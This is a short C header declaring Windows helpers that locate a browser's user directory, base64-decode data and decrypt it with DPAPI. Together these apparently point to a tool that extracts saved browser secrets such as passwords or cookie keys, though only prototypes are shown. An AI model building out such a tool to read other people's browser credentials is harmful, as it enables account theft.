#pragma once
#include <stdio.h>
#include <Shlobj.h>
#include <wchar.h>
#include <shlwapi.h>

BOOL get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize);
BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* decrypted_data);
BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_string);
BOOL checkSubtring(const CHAR* substring, PCHAR test_string);